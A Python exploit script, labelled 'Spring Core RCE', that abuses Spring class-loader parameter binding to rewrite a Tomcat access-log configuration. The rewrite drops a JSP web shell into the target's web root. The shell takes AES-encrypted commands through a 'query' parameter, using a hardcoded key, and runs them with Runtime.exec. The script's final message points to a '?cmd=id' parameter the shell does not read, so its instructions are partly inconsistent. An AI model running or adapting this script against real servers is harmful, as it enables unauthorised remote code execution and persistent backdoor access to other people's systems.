# Author: @Rezn0k
# Based off the work of p1n93r

import requests
import argparse
from urllib.parse import urlparse
import time

# Set to bypass errors if the target site has SSL issues
requests.packages.urllib3.disable_warnings()

post_headers = {
    "Content-Type": "application/x-www-form-urlencoded"
}

get_headers = {
    "prefix": "<%",
    "suffix": "%>",
    # This may seem strange, but this seems to be needed to bypass some check that looks for "Runtime" in the log_pattern
    "c": "Runtime",
}


def run_exploit(url, directory, filename):
    log_pattern = f"class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di@%20page%20import%3D%22java.io.*%2Cjavax.crypto.*%2Cjavax.crypto.spec.*%2Cjava.util.*%22%20%25%7Bsuffix%7Di%0A%25%7Bprefix%7Di%0A%20%20%20%20char%5B%5D%20keyChars%20%3D%20%7B%0A%20%20%20%20%20%20%20%20%27s%27%2C%273%27%2C%27c%27%2C%27r%27%2C%273%27%2C%27t%27%2C%27K%27%2C%273%27%2C%27y%27%2C%271%27%2C%272%27%2C%273%27%2C%274%27%2C%275%27%2C%276%27%2C%277%27%0A%20%20%20%20%7D%3B%0A%20%20%20%20String%20keyString%20%3D%20new%20String(keyChars)%3B%0A%20%20%20%20byte%5B%5D%20keyBytes%20%3D%20keyString.getBytes(%22UTF-8%22)%3B%0A%20%20%20%20SecretKeySpec%20secretKey%20%3D%20new%20SecretKeySpec(keyBytes%2C%20%22AES%22)%3B%0A%0A%20%20%20%20Cipher%20aesCipher%20%3D%20Cipher.getInstance(%22AES/ECB/PKCS5Padding%22)%3B%0A%20%20%20%20aesCipher.init(Cipher.DECRYPT_MODE%2C%20secretKey)%3B%0A%0A%20%20%20%20String%20encodedToken%20%3D%20request.getParameter(%22query%22)%3B%0A%20%20%20%20if%20(encodedToken%20%3D%3D%20null)%20%7B%0A%20%20%20%20%20%20%20%20out.print(%22%22)%3B%0A%20%20%20%20%20%20%20%20return%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20byte%5B%5D%20encryptedBytes%20%3D%20Base64.getDecoder().decode(encodedToken)%3B%0A%20%20%20%20String%20command%3B%0A%20%20%20%20try%20%7B%0A%20%20%20%20%20%20%20%20command%20%3D%20new%20String(aesCipher.doFinal(encryptedBytes)%2C%20%22UTF-8%22)%3B%0A%20%20%20%20%7D%20catch%20(Exception%20e)%20%7B%0A%20%20%20%20%20%20%20%20out.print(e.getMessage())%3B%0A%20%20%20%20%20%20%20%20return%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20Process%20process%20%3D%20Runtime.getRuntime().exec(command)%3B%0A%20%20%20%20InputStream%20processStream%20%3D%20process.getInputStream()%3B%0A%20%20%20%20javax.servlet.ServletOutputStream%20clientStream%20%3D%20response.getOutputStream()%3B%0A%0A%20%20%20%20byte%5B%5D%20buffer%20%3D%20new%20byte%5B0x800%5D%3B%0A%20%20%20%20int%20bytesRead%3B%0A%20%20%20%20while%20((bytesRead%20%3D%20processStream.read(buffer))%20!%3D%20-1)%20%7B%0A%20%20%20%20%20%20%20%20clientStream.write(buffer%2C%200%2C%20bytesRead)%3B%0A%20%20%20%20%7D%0A%25%7Bsuffix%7Di//"

    log_file_suffix = "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp"
    log_file_dir = f"class.module.classLoader.resources.context.parent.pipeline.first.directory={directory}"
    log_file_prefix = f"class.module.classLoader.resources.context.parent.pipeline.first.prefix={filename}"
    log_file_date_format = "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="

    exp_data = "&".join([log_pattern, log_file_suffix, log_file_dir, log_file_prefix, log_file_date_format])

    # Setting and unsetting the fileDateFormat field allows for executing the exploit multiple times
    # If re-running the exploit, this will create an artifact of {old_file_name}_.jsp
    file_date_data = "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=_"
    print("[*] Resetting Log Variables.")
    ret = requests.post(url, headers=post_headers, data=file_date_data, verify=False)
    print("[*] Response code: %d" % ret.status_code)

    # Change the tomcat log location variables
    print("[*] Modifying Log Configurations")
    ret = requests.post(url, headers=post_headers, data=exp_data, verify=False)
    print("[*] Response code: %d" % ret.status_code)

    # Changes take some time to populate on tomcat
    time.sleep(3)

    # Send the packet that writes the web shell
    ret = requests.get(url, headers=get_headers, verify=False)
    print("[*] Response Code: %d" % ret.status_code)

    time.sleep(1)

    # Reset the pattern to prevent future writes into the file
    pattern_data = "class.module.classLoader.resources.context.parent.pipeline.first.pattern="
    print("[*] Resetting Log Variables.")
    ret = requests.post(url, headers=post_headers, data=pattern_data, verify=False)
    print("[*] Response code: %d" % ret.status_code)


def main():
    parser = argparse.ArgumentParser(description='Spring Core RCE')
    parser.add_argument('--url', help='target url', required=True)
    parser.add_argument('--file', help='File to write to [no extension]', required=False, default="shell")
    parser.add_argument('--dir', help='Directory to write to. Suggest using "webapps/[appname]" of target app',
                        required=False, default="webapps/ROOT")

    file_arg = parser.parse_args().file
    dir_arg = parser.parse_args().dir
    url_arg = parser.parse_args().url

    filename = file_arg.replace(".jsp", "")

    if url_arg is None:
        print("Must pass an option for --url")
        return

    try:
        run_exploit(url_arg, dir_arg, filename)
        print("[+] Exploit completed")
        print("[+] Check your target for a shell")
        print("[+] File: " + filename + ".jsp")

        if dir_arg:
            location = urlparse(url_arg).scheme + "://" + urlparse(url_arg).netloc + "/" + filename + ".jsp"
        else:
            location = f"Unknown. Custom directory used. (try app/{filename}.jsp?cmd=id"
        print(f"[+] Shell should be at: {location}?cmd=id")
    except Exception as e:
        print(e)


if __name__ == '__main__':
    main()
